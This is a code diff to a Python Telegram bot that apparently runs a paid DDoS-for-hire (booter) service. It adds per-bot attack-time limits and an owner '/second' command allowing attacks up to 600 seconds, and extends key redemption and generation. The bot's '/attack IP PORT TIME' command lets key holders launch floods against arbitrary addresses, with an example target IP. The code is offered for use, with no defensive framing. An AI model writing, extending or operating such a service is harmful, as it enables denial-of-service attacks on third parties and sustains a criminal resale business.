@@ -177,7 +177,8 @@ def load_hosted_bots():
                 "blocked": bot_data.get("blocked", False),
                 "active_attacks": {},
                 "users": bot_data.get("users", []),
-                "resellers": bot_data.get("resellers", [])
+                "resellers": bot_data.get("resellers", []),
+                "max_attack_time": bot_data.get("max_attack_time", 300)
             }
     except Exception as e:
         print(f"Error loading hosted bots: {e}")
@@ -194,7 +195,8 @@ def save_hosted_bots(bots_data):
                 "concurrent": info.get("concurrent", 1),
                 "blocked": info.get("blocked", False),
                 "users": info.get("users", []),
-                "resellers": info.get("resellers", [])
+                "resellers": info.get("resellers", []),
+                "max_attack_time": info.get("max_attack_time", 300)
             })
     except Exception as e:
         print(f"Error saving hosted bots: {e}")
@@ -404,6 +406,11 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         hosted_bot_instances[bot_token] = hosted_bot
         hosted_cooldown_data = {}
         
+        # Get hosted bot specific settings
+        bot_max_time = MAX_ATTACK_TIME
+        if bot_token in hosted_bots:
+            bot_max_time = hosted_bots[bot_token].get("max_attack_time", MAX_ATTACK_TIME)
+        
         def hstyled(title, content, status="info"):
             if status == "success":
                 icon = "✅"
@@ -422,20 +429,111 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['start'])
         def hosted_start(msg):
+            uid = str(msg.chat.id)
             current_time = format_ist_time(get_current_ist())
-            content = f"│ 👑 Owner: {owner_name}\n│ ✅ Status: Active\n│ ⚡ Concurrent: {concurrent}\n│ ⏱️ Max Time: {MAX_ATTACK_TIME}s\n│ 📅 {current_time}\n│\n│ 📝 COMMANDS:\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /redeem KEY\n│ /help"
-            hosted_bot.reply_to(msg, hstyled("DDOS BOT", content, "attack"))
+            
+            # Check if user has access
+            has_access = check_user_expiry(uid)
+            
+            if has_access:
+                content = f"""│ ✅ ACCESS ACTIVE
+│ 👑 Owner: {owner_name}
+│ ⚡ Concurrent: {concurrent}
+│ ⏱️ Max Time: {bot_max_time}s
+│ 📅 {current_time}
+│
+│ 📝 COMMANDS:
+│   /attack IP PORT TIME
+│   /status
+│   /cooldown
+│   /genkey 1 or 1h
+│   /help"""
+                hosted_bot.reply_to(msg, hstyled("DDOS BOT", content, "attack"))
+            else:
+                content = f"""│ 🔑 NO ACCESS
+│ 👑 Owner: {owner_name}
+│ ⚡ Concurrent: {concurrent}
+│ ⏱️ Max Time: {bot_max_time}s
+│ 📅 {current_time}
+│
+│ 📝 To get access:
+│   /redeem KEY
+│
+│ 📝 COMMANDS:
+│   /redeem KEY
+│   /help"""
+                hosted_bot.reply_to(msg, hstyled("ACCESS REQUIRED", content, "warning"))
         
         @hosted_bot.message_handler(commands=['help'])
         def hosted_help(msg):
             uid = str(msg.chat.id)
             current_time = format_ist_time(get_current_ist())
-            content = f"│ 🔥 USER COMMANDS\n│\n│ /attack IP PORT TIME\n│ /status\n│ /cooldown\n│ /redeem KEY\n│ /help\n│ 📅 {current_time}"
-            hosted_bot.reply_to(msg, hstyled("HELP", content))
+            has_access = check_user_expiry(uid)
+            
+            if has_access:
+                content = f"""│ 🔥 USER HELP
+│
+│ ⚔️ ATTACK:
+│   /attack IP PORT TIME
+│   /status
+│   /cooldown
+│
+│ 🔑 KEYS:
+│   /genkey 1 or 1h
+│
+│ 📅 {current_time}"""
+                hosted_bot.reply_to(msg, hstyled("HELP", content))
+            else:
+                content = f"""│ 🔑 NO ACCESS
+│
+│ Use /redeem KEY to get access
+│
+│ 📅 {current_time}"""
+                hosted_bot.reply_to(msg, hstyled("HELP", content, "warning"))
+        
+        @hosted_bot.message_handler(commands=['genkey'])
+        def hosted_genkey(msg):
+            uid = str(msg.chat.id)
+            
+            # Check if user has access
+            if not check_user_expiry(uid):
+                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key to generate keys!")
+                return
+            
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /genkey 1 or /genkey 1h\n📌 Example: /genkey 1 (1 day)\n📌 Example: /genkey 5h (5 hours)")
+                return
+            
+            duration_str = args[1]
+            value, unit = parse_duration(duration_str)
+            if value is None:
+                hosted_bot.reply_to(msg, "❌ Invalid duration! Use 1 or 5h")
+                return
+            
+            key = generate_key()
+            expires_at = get_expiry_date(value, unit)
+            keys_data[key] = {
+                "duration_value": value, 
+                "duration_unit": unit, 
+                "generated_by": uid, 
+                "generated_at": time.time(), 
+                "expires_at": expires_at.timestamp(), 
+                "used": False
+            }
+            save_keys(keys_data)
+            expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
+            
+            hosted_bot.reply_to(msg, f"🔑 KEY GENERATED!\n\n🔑 {key}\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}")
         
         @hosted_bot.message_handler(commands=['cooldown'])
         def hosted_cooldown(msg):
             uid = str(msg.chat.id)
+            
+            if not check_user_expiry(uid):
+                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key!")
+                return
+            
             if uid in hosted_cooldown_data:
                 remaining = hosted_cooldown_data[uid] - time.time()
                 if remaining > 0:
@@ -489,6 +587,11 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         def hosted_status(msg):
             uid = str(msg.chat.id)
             current_time = format_ist_time(get_current_ist())
+            
+            if not check_user_expiry(uid):
+                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key!")
+                return
+            
             if bot_token in hosted_bots:
                 bot_info = hosted_bots[bot_token]
                 now = time.time()
@@ -515,17 +618,13 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         def hosted_attack(msg):
             uid = str(msg.chat.id)
             
-            if uid not in users:
-                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access.")
-                return
-            
             if not check_user_expiry(uid):
-                hosted_bot.reply_to(msg, "❌ ACCESS EXPIRED!\n\nYour key has expired.\nUse /redeem KEY to get new access.")
+                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access.")
                 return
             
             args = msg.text.split()
             if len(args) != 4:
-                hosted_bot.reply_to(msg, f"❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 60\n⏱️ Max Time: {MAX_ATTACK_TIME}s")
+                hosted_bot.reply_to(msg, f"❌ Usage: /attack IP PORT TIME\n📌 Example: /attack 20.4.57.28 17837 60\n⏱️ Max Time: {bot_max_time}s")
                 return
             
             ip, port, duration = args[1], args[2], args[3]
@@ -544,8 +643,8 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                     hosted_bot.reply_to(msg, "❌ Port must be between 1 and 65535!")
                     return
                 duration = int(duration)
-                if duration < 10 or duration > MAX_ATTACK_TIME:
-                    hosted_bot.reply_to(msg, f"❌ Duration must be 10-{MAX_ATTACK_TIME} seconds!")
+                if duration < 10 or duration > bot_max_time:
+                    hosted_bot.reply_to(msg, f"❌ Duration must be 10-{bot_max_time} seconds!")
                     return
             except:
                 hosted_bot.reply_to(msg, "❌ Invalid port or time!")
@@ -590,7 +689,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             hosted_cooldown_data[uid] = now + COOLDOWN_TIME
             
             if bot_token not in hosted_bots:
-                hosted_bots[bot_token] = {"active_attacks": {}, "owner_id": owner_id, "owner_name": owner_name, "concurrent": concurrent, "users": []}
+                hosted_bots[bot_token] = {"active_attacks": {}, "owner_id": owner_id, "owner_name": owner_name, "concurrent": concurrent, "users": [], "max_attack_time": bot_max_time}
             if "active_attacks" not in hosted_bots[bot_token]:
                 hosted_bots[bot_token]["active_attacks"] = {}
             
@@ -625,6 +724,35 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                     del hosted_bots[bot_token]["active_attacks"][attack_id]
                     save_hosted_bots(hosted_bots)
             threading.Thread(target=run).start()
+        
+        @hosted_bot.message_handler(commands=['second'])
+        def hosted_second(msg):
+            uid = str(msg.chat.id)
+            
+            # Only bot owner can change max time
+            if uid != owner_id:
+                hosted_bot.reply_to(msg, "❌ Only bot owner can change max time!")
+                return
+            
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /second 10-600\n📌 Example: /second 180")
+                return
+            
+            try:
+                new_max = int(args[1])
+                if new_max < 10 or new_max > 600:
+                    hosted_bot.reply_to(msg, "❌ Value must be 10-600 seconds!")
+                    return
+                
+                if bot_token in hosted_bots:
+                    hosted_bots[bot_token]["max_attack_time"] = new_max
+                    save_hosted_bots(hosted_bots)
+                    hosted_bot.reply_to(msg, f"✅ Max attack time set to {new_max}s for this bot!")
+                else:
+                    hosted_bot.reply_to(msg, "❌ Bot not found!")
+            except:
+                hosted_bot.reply_to(msg, "❌ Invalid number!")
         
         def run_hosted_bot():
             try:
@@ -787,7 +915,8 @@ def host_bot_cmd(msg):
         "blocked": False,
         "active_attacks": {},
         "users": [],
-        "resellers": []
+        "resellers": [],
+        "max_attack_time": MAX_ATTACK_TIME
     }
     save_hosted_bots(hosted_bots)
     
@@ -838,7 +967,7 @@ def all_hosts_cmd(msg):
     host_list = []
     for token, info in hosted_bots.items():
         status = "🔴 BLOCKED" if info.get("blocked", False) else "🟢 ACTIVE"
-        host_list.append(f"🔑 {token[:20]}...\n   👑 Owner: {info['owner_id']}\n   📛 Name: {info['owner_name']}\n   ⚡ Concurrent: {info['concurrent']}\n   {status}")
+        host_list.append(f"🔑 {token[:20]}...\n   👑 Owner: {info['owner_id']}\n   📛 Name: {info['owner_name']}\n   ⚡ Concurrent: {info['concurrent']}\n   ⏱️ Max Time: {info.get('max_attack_time', MAX_ATTACK_TIME)}s\n   {status}")
     
     if host_list:
         bot.reply_to(msg, f"📋 ALL HOSTED BOTS:\n\n" + "\n\n".join(host_list) + f"\n\n📊 Total: {len(hosted_bots)}")
